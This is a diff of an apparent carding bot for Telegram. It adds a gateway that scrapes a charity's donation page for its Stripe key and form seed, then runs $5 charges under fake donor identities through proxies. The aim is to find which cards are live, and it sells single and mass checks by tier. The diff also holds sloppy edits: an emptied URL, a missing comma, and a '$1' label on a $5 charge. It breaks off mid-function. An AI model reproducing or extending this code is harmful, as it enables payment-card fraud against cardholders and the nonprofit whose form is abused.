@@ -11525,7 +11525,7 @@ SHOPIFY_API_POOL = [
     
     {
         "name": " s1",
-        "url": "https://s1-production-1118.up.railway.app/shopify",
+        "url": "https://s1-production-9eca.up.railway.app/shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -11539,7 +11539,7 @@ SHOPIFY_API_POOL = [
     },
     {
         "name": " s2",
-        "url": "https://s2-production-cf59.up.railway.app/shopify",
+        "url": "https:///shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -13471,6 +13471,9 @@ async def disable_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE
             return
     
     await update.message.reply_text(f"❌ API not found: {api_name}")
+
+
+
 
 
 # ============ NEW STRIPE API CHECK FUNCTION ============
@@ -17182,6 +17185,8 @@ async def auto_detect_reply_with_command(update: Update, context: ContextTypes.D
         # Adyen
         '/ad': ('adyen', False),
         
+        '/st': ('stripe_1usd', False),  
+        '/mst': ('stripe_1usd', True),  
 
         
         # New Stripe
@@ -17365,7 +17370,7 @@ class UserManager:
         "can_use_proxy": True,
         "can_access_gateways": [
             
-            "shopify", "razorpay", "stripe_auth0",
+
             # <-- ADD THIS LINE
             # Add other gateways you want free users to access
         ],
@@ -17407,7 +17412,7 @@ class UserManager:
             "can_access_gateways": [
                 "shopify", "auto_stripe", "adyen_direct", "paypal", "stripe_charge_v2","adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth","paypal_donation", "stripe_chk", "st1_gateway" ,
-                "dork", "braintree", "autosopi", "payflow"
+                "dork", "braintree", "autosopi", "payflow" "stripe_1usd",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -17427,7 +17432,7 @@ class UserManager:
             "can_access_gateways": [
                 "paypal", "shopify", "adyen_direct", "auto_stripe","stripe_charge_v2", "adyen","stripe_pl","stripe_auth0",
                 "b3charged", "razorpay", "stripe_charge", "stripe_auth", "paypal_donation",
-                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" ,
+                "braintree", "autosopi", "payflow", "stripe_chk","st1_gateway" , "stripe_1usd",
             ],
             "can_add_autosopi_sites": True,
             "can_mass_check": True,
@@ -53874,9 +53879,10 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         
         '/mchk': 'stripe_chk',
         '/chk' : 'stripe_chk',
-        
-        '/st': 'st1_gateway',
-        '/mst': 'st1_gateway',
+         
+        '/mst': 'stripe_1usd',
+        '/st': 'stripe_1usd',
+         
     }
     
     
@@ -53888,12 +53894,10 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
     if not gateway:
         await update.message.reply_text(
             f"❌ Invalid command. Use:\n"
-            f"/aumc - Autosopi (Shopify)\n"
+            f"/msh - Autosopi (Shopify)\n"
             f"/mrz - Razorpay\n"
-            f"/mrz1 - Razorpay2 (₹100)\n"
             f"/mchk - Auto Stripe\n"
-            f"/msc - Stripe Charge V2 Mass\n"
-            f"/ad - Adyen",
+            f"/mst - Stripe Charge ",
             parse_mode=ParseMode.HTML
         )
         return True
@@ -54155,6 +54159,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(mass_check_stripe_chk_logic(update, context, cards, progress_msg))
     elif gateway == 'st1_gateway':
         asyncio.create_task(st1_gateway_mass_check_logic(update, context, cards, progress_msg))
+    elif gateway == 'stripe_1usd':
+        asyncio.create_task(mass_check_stripe_1usd_logic(update, context, cards, progress_msg))
     else:
         await update.message.reply_text(f"❌ Gateway {gateway} not implemented yet.")
     
@@ -58800,6 +58806,990 @@ async def autosopi_filter_status(update: Update, context: ContextTypes.DEFAULT_T
     )
 
 
+# ============ STRIPE $1 GATEWAY (BELOVEDCOMMUNITY) ============
+# Add this to your f13.py
+
+import hashlib
+import uuid
+import re
+import json
+import time
+import random
+import asyncio
+import traceback
+from typing import Dict, Tuple, Optional, List
+from datetime import datetime
+import httpx
+from faker import Faker
+from user_agent import generate_user_agent
+
+# Active tasks for Stripe $1 Gateway
+stripe_1usd_active_tasks = {}
+
+# ============ STRIPE $1 CONFIG ============
+STRIPE_1USD_SITE = "https://belovedcommunity.org"
+STRIPE_1USD_DONATE_URL = f"{STRIPE_1USD_SITE}/donate/"
+STRIPE_1USD_FORM_ID = "1127"
+STRIPE_1USD_POST_ID = "142"
+STRIPE_1USD_AMOUNT = 5  # $5.00
+
+def calculate_hash_stripe_1usd(data_list: list) -> str:
+    """Calculates the HappyForms anti-spam hash."""
+    values = [str(item['value']) for item in data_list]
+    joined = "".join(values)
+    stripped = re.sub(r'\W', '', joined)
+    return hashlib.md5(stripped.encode()).hexdigest()
+
+async def get_stripe_1usd_config(proxy: str = None) -> Tuple[Optional[str], Optional[str], Dict]:
+    """Fetches the site to initialize cookies and extract PK and random seed."""
+    try:
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+                print(f"🔧 [Stripe $1] Using proxy: {mask_proxy(proxy_url)}")
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.get(STRIPE_1USD_DONATE_URL)
+            
+            if response.status_code != 200:
+                return None, None, {}
+            
+            html = response.text
+            
+            # Extract Stripe publishable key
+            pk_match = re.search(r'"key":"(pk_live_[^"]+)"', html)
+            pk = pk_match.group(1) if pk_match else None
+            
+            # Extract random seed
+            seed_match = re.search(r'name="happyforms_random_seed" value="(\d+)"', html)
+            random_seed = seed_match.group(1) if seed_match else None
+            
+            # Get cookies
+            cookies = {}
+            for cookie in response.cookies.jar._cookies.values():
+                for c in cookie.values():
+                    cookies[c.name] = c.value
+            
+            print(f"✅ [Stripe $1] Got PK: {pk[:20] if pk else 'None'}...")
+            print(f"✅ [Stripe $1] Random seed: {random_seed}")
+            
+            return pk, random_seed, cookies
+            
+    except Exception as e:
+        print(f"❌ [Stripe $1] Config fetch error: {e}")
+        return None, None, {}
+
+async def create_stripe_1usd_payment_method(pk: str, card: str, proxy: str = None) -> Optional[str]:
+    """Creates a payment method on Stripe."""
+    try:
+        parts = card.split('|')
+        if len(parts) != 4:
+            return None
+        
+        card_num, exp_month, exp_year, cvc = parts
+        
+        # Format year
+        if len(exp_year) == 4:
+            exp_year = exp_year[2:]
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(30.0, connect=10.0, read=25.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+        
+        data = {
+            'type': 'card',
+            'card[number]': card_num,
+            'card[exp_month]': exp_month,
+            'card[exp_year]': exp_year,
+            'card[cvc]': cvc,
+        }
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            response = await client.post(
+                'https://api.stripe.com/v1/payment_methods',
+                auth=(pk, ''),
+                data=data
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                pm_id = result.get('id')
+                if pm_id:
+                    print(f"✅ [Stripe $1] Payment method created: {pm_id}")
+                    return pm_id
+            
+            print(f"❌ [Stripe $1] Payment method creation failed: {response.status_code}")
+            return None
+            
+    except Exception as e:
+        print(f"❌ [Stripe $1] Payment method error: {e}")
+        return None
+
+async def check_card_stripe_1usd(card: str, proxy: str = None, user_id: int = None) -> Dict:
+    """
+    Check card using Beloved Community Stripe $1 gateway
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [STRIPE $1 GATEWAY] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    print(f"{'='*80}")
+    
+    start_time = time.time()
+    
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$5.00",
+        "gateway": "Stripe $1"
+    }
+    
+    try:
+        # Step 1: Get config (PK, random seed, cookies)
+        pk, random_seed, cookies = await get_stripe_1usd_config(proxy)
+        if not pk or not random_seed:
+            return {
+                "status": "error",
+                "result": "CONFIG_FAILED",
+                "message": "Failed to get site config",
+                "status_display": "⚠️ CONFIG ERROR",
+                "status_category": "error",
+                "elapsed": time.time() - start_time,
+                "price": "$5.00",
+                "gateway": "Stripe $1"
+            }
+        
+        # Step 2: Create Stripe payment method
+        pm_id = await create_stripe_1usd_payment_method(pk, card, proxy)
+        if not pm_id:
+            return {
+                "status": "declined",
+                "result": "PM_CREATION_FAILED",
+                "message": "Failed to create payment method",
+                "status_display": "❌ DECLINED",
+                "status_category": "declined",
+                "elapsed": time.time() - start_time,
+                "price": "$5.00",
+                "gateway": "Stripe $1"
+            }
+        
+        # Step 3: Submit donation form
+        stripe_mid = str(uuid.uuid4())
+        stripe_sid = str(uuid.uuid4())
+        
+        # Parse card for name/email
+        fake = Faker()
+        first_name = fake.first_name()
+        last_name = fake.last_name()
+        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100, 9999)}@gmail.com"
+        
+        client_kwargs = {
+            'timeout': httpx.Timeout(45.0, connect=15.0, read=35.0),
+            'verify': False,
+            'follow_redirects': True,
+        }
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                client_kwargs['proxy'] = proxy_url
+        
+        async with httpx.AsyncClient(**client_kwargs) as client:
+            # Set cookies
+            client.cookies.set('__stripe_mid', stripe_mid, domain='belovedcommunity.org')
+            client.cookies.set('__stripe_sid', stripe_sid, domain='belovedcommunity.org')
+            
+            pm_cookie_val = json.dumps({"payment_method": pm_id}).replace(' ', '')
+            client.cookies.set(f'happyforms_{STRIPE_1USD_FORM_ID}_stripe_checkout', pm_cookie_val, domain='belovedcommunity.org')
+            
+            # Build form data
+            data_for_hash = [
+                {'name': 'action', 'value': 'happyforms_message'},
+                {'name': 'happyforms_client_referer', 'value': STRIPE_1USD_DONATE_URL},
+                {'name': 'happyforms_current_post_id', 'value': STRIPE_1USD_POST_ID},
+                {'name': 'happyforms_form_id', 'value': STRIPE_1USD_FORM_ID},
+                {'name': 'happyforms_step', 'value': '0'},
+                {'name': 'happyforms_random_seed', 'value': random_seed},
+                {'name': f'{STRIPE_1USD_FORM_ID}-single_line_text', 'value': ''},
+                {'name': f'{STRIPE_1USD_FORM_ID}_single_line_text_2', 'value': f'{first_name} {last_name}'},
+                {'name': f'{STRIPE_1USD_FORM_ID}_email_3', 'value': email},
+                {'name': f'{STRIPE_1USD_FORM_ID}_payments_1[price]', 'value': str(STRIPE_1USD_AMOUNT)},
+                {'name': f'{STRIPE_1USD_FORM_ID}_payments_1[payment_method]', 'value': 'stripe'},
+                {'name': f'{STRIPE_1USD_FORM_ID}_payments_1[filled]', 'value': '1'},
+                {'name': f'{STRIPE_1USD_FORM_ID}_single_line_text_4', 'value': ''},
+            ]
+            
+            form_hash = calculate_hash_stripe_1usd(data_for_hash)
+            
+            headers = {
+                'authority': 'belovedcommunity.org',
+                'accept': '*/*',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://belovedcommunity.org',
+                'referer': STRIPE_1USD_DONATE_URL,
+                'user-agent': generate_user_agent(),
+                'x-requested-with': 'XMLHttpRequest',
+            }
+            
+            payload = {item['name']: item['value'] for item in data_for_hash}
+            payload['hash'] = form_hash
+            payload.update({
+                'platform_info[user_agent]': headers['user-agent'],
+                'platform_info[app_version]': '5.0 (Windows)',
+                'platform_info[language]': 'en-US',
+                'platform_info[languages_length]': '2',
+                'platform_info[webdriver]': '0',
+                'platform_info[concurrency]': '8',
+                'platform_info[outer_width]': '1920',
+                'platform_info[outer_height]': '1080',
+                'platform_info[connectionRtt]': '100',
+            })
+            
+            response = await client.post(
+                STRIPE_1USD_DONATE_URL,
+                headers=headers,
+                data=payload
+            )
+            
+            # Extract client secret
+            secret_match = re.search(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+', response.text)
+            if not secret_match:
+                # Check for error in response
+                if "card_declined" in response.text.lower():
+                    decline_match = re.search(r'"decline_code":\s*"([^"]+)"', response.text)
+                    decline_code = decline_match.group(1) if decline_match else "unknown"
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": f"Card declined: {decline_code}",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": time.time() - start_time,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+                
+                return {
+                    "status": "error",
+                    "result": "NO_CLIENT_SECRET",
+                    "message": "Payment intent secret not found",
+                    "status_display": "⚠️ SECRET ERROR",
+                    "status_category": "error",
+                    "elapsed": time.time() - start_time,
+                    "price": "$5.00",
+                    "gateway": "Stripe $1"
+                }
+            
+            client_secret = secret_match.group(0)
+            intent_id = client_secret.split('_secret_')[0]
+            
+            # Step 4: Confirm payment with Stripe
+            headers_stripe = {
+                'authority': 'api.stripe.com',
+                'accept': 'application/json',
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'user-agent': generate_user_agent(),
+            }
+            
+            stripe_confirm_payload = {
+                'payment_method': pm_id,
+                'expected_payment_method_type': 'card',
+                'use_stripe_sdk': 'true',
+                'key': pk,
+                'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
+                'client_attribution_metadata[merchant_integration_source]': 'l1',
+                'client_secret': client_secret
+            }
+            
+            confirm_response = await client.post(
+                f'https://api.stripe.com/v1/payment_intents/{intent_id}/confirm',
+                headers=headers_stripe,
+                data=stripe_confirm_payload
+            )
+            
+            elapsed = time.time() - start_time
+            
+            # Step 5: Parse response
+            try:
+                result = confirm_response.json()
+                
+                if result.get("status") == "succeeded":
+                    return {
+                        "status": "success",
+                        "result": "CHARGED",
+                        "message": "Order placed - Card charged $5",
+                        "status_display": "🔥 CHARGED ",
+                        "status_category": "charged",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1",
+                        "payment_id": result.get('id')
+                    }
+                elif result.get("status") == "requires_action":
+                    return {
+                        "status": "declined",
+                        "result": "3DS_REQUIRED",
+                        "message": "3D Secure required ",
+                        "status_display": "🔐 3DS REQUIRED",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+                elif "error" in result:
+                    error = result["error"]
+                    error_msg = error.get("message", "Unknown error")
+                    decline_code = error.get("decline_code", "unknown")
+                    
+                    # Check for specific error types
+                    if "insufficient" in error_msg.lower():
+                        return {
+                            "status": "success",
+                            "result": "INSUFFICIENT_FUNDS",
+                            "message": f"Insufficient funds: {error_msg}",
+                            "status_display": "💰 INSUFFICIENT FUNDS",
+                            "status_category": "approved",
+                            "elapsed": elapsed,
+                            "price": "$5.00",
+                            "gateway": "Stripe $1"
+                        }
+                    elif "cvv" in error_msg.lower() or "security" in error_msg.lower():
+                        return {
+                            "status": "success",
+                            "result": "CVV_LIVE",
+                            "message": f"CVV verification failed: {error_msg}",
+                            "status_display": "✅ CVV LIVE",
+                            "status_category": "approved",
+                            "elapsed": elapsed,
+                            "price": "$5.00",
+                            "gateway": "Stripe $1"
+                        }
+                    else:
+                        return {
+                            "status": "declined",
+                            "result": "DECLINED",
+                            "message": f"Card declined: {error_msg}",
+                            "status_display": f"❌ DECLINED ({decline_code})",
+                            "status_category": "declined",
+                            "elapsed": elapsed,
+                            "price": "$5.00",
+                            "gateway": "Stripe $1"
+                        }
+                else:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": "Card declined",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+                    
+            except json.JSONDecodeError:
+                # Fallback: check response text
+                if "succeeded" in confirm_response.text:
+                    return {
+                        "status": "success",
+                        "result": "CHARGED",
+                        "message": " Payment successful ",
+                        "status_display": "🔥 CHARGED ",
+                        "status_category": "charged",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+                elif "card_declined" in confirm_response.text:
+                    decline_match = re.search(r'"decline_code":\s*"([^"]+)"', confirm_response.text)
+                    decline_code = decline_match.group(1) if decline_match else "unknown"
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": f"Card declined: {decline_code}",
+                        "status_display": f"❌ DECLINED ({decline_code})",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+                else:
+                    return {
+                        "status": "declined",
+                        "result": "DECLINED",
+                        "message": "Card declined",
+                        "status_display": "❌ DECLINED",
+                        "status_category": "declined",
+                        "elapsed": elapsed,
+                        "price": "$5.00",
+                        "gateway": "Stripe $1"
+                    }
+            
+    except httpx.TimeoutException:
+        print(f"⏰ [Stripe $1] Timeout error")
+        return {
+            "status": "error",
+            "result": "TIMEOUT",
+            "message": "Request timeout",
+            "status_display": "⚠️ TIMEOUT",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": "$5.00",
+            "gateway": "Stripe $1"
+        }
+    except Exception as e:
+        print(f"❌ [Stripe $1] Error: {e}")
+        traceback.print_exc()
+        return {
+            "status": "error",
+            "result": "ERROR",
+            "message": str(e)[:100],
+            "status_display": "⚠️ ERROR",
+            "status_category": "error",
+            "elapsed": time.time() - start_time,
+            "price": "$5.00",
+            "gateway": "Stripe $1"
+        }
+
+def format_stripe_1usd_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Stripe $1 response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Stripe $1")
+    price = result.get("price", "$5.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ Strip Charged \n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ 1$\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+# ============ SINGLE CHECK ============
+
+@check_gateway("stripe_1usd")
+async def single_check_stripe_1usd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Stripe $1 gateway - /st"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Stripe $1 Gateway</b>\n\n"
+            "Usage: <code>/st &lt;card&gt;</code>\n"
+            "Example: <code>/st 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $5.00\n"
+            "📍 Gateway: Beloved Community Stripe\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Stripe $1 not available for {tier.upper()} tier</b>\n\n"
+            f"Upgrade to Premium/Ultimate to use this gateway.",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+    
+    stripe_1usd_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking card with Stripe $1...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Stripe $1] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_stripe_1usd(card, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_stripe_1usd_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Stripe $1",
+                response=result.get("message", "Approved"),
+                price="$5.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Stripe $1", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$5.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Stripe $1] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        stripe_1usd_active_tasks.pop(user_id, None)
+
+# ============ MASS CHECK ============
+
+@check_gateway("stripe_1usd")
+async def mass_check_stripe_1usd_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Stripe $1 gateway - /mst"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    if user_id in stripe_1usd_active_tasks:
+        await message.reply_text(
+            "⚠️ You already have an active Stripe $1 session.\n"
+            "Please wait for it to finish or use /stop to cancel.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Stripe $1 not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /st for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await mass_check_stripe_1usd_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    # Handle direct text input
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe $1 Mass Check</b>\n\n"
+            "Usage: <code>/mst &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mst\n\n"
+            "Example: <code>/mst 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $5.00\n"
+            "📍 Gateway: Beloved Community Stripe\n"
+            "✅ Only charged/approved cards will be shown",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await mass_check_stripe_1usd_logic(update, context, cards, None)
+
+async def mass_check_stripe_1usd_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Stripe $1 gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [STRIPE $1 MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+        else:
+            print(f"⚠️ No working proxies found, using direct connection")
+    
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        stripe_1usd_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        CONCURRENCY = {
+            "free": 2,
+            "premium": 5,
+            "ultimate": 1,
+            "admin": 1,
+        }.get(tier, 2)
+        
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe $1\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
